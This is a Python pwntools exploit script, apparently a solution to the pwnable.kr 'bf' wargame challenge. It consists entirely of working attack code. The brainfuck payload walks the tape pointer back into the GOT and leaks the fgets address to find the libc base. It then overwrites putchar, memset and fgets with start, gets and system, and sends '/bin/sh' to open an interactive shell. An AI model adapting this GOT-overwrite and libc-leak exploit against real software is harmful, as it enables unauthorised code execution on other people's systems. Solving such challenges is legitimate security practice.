from pwn import *
  

#sh = process("./bf") 
#libc = ELF("/lib/i386-linux-gnu/libc.so.6")
libc = ELF("./bf_libc.so")
e = ELF("./bf")
sh = remote("pwnable.kr",9001)
print sh.recvuntil("type some brainfuck instructions except [ ]\n")


payload = "<" * 144 + ".>.>.>."  # leak fgets address  
payload += ">"*29 + ",>,>,>,"  # overwrite putchar address -> start 
payload += "<" * 7 + ",>,>,>,"  # overwrite memset -> gets 
payload += "<" * 31 + ",>,>,>,"  # overwrite fgest to system 
payload += "."
sh.sendline(payload)
assert len(payload) <= 1024
pause()

# leak libc address 
putchar_addr = u32(sh.recv(4))
libc.address = putchar_addr - libc.sym['fgets']
system = libc.sym['system']
gets = libc.sym['gets']
log.success("putchar_addr = " + hex(putchar_addr))
log.success("libc_addr = " + hex(libc.address))
log.success("system_addr = " + hex(system))
log.success("gets_addr = " + hex(gets))


# return to system
start = 0x080484E0
raw_input("debug")
sh.send(p32(start))
sh.send(p32(gets))
sh.send(p32(system))

print sh.recvuntil("type some brainfuck instructions except [ ]\n")

sh.sendline("/bin/sh\x00")
sh.interactive()
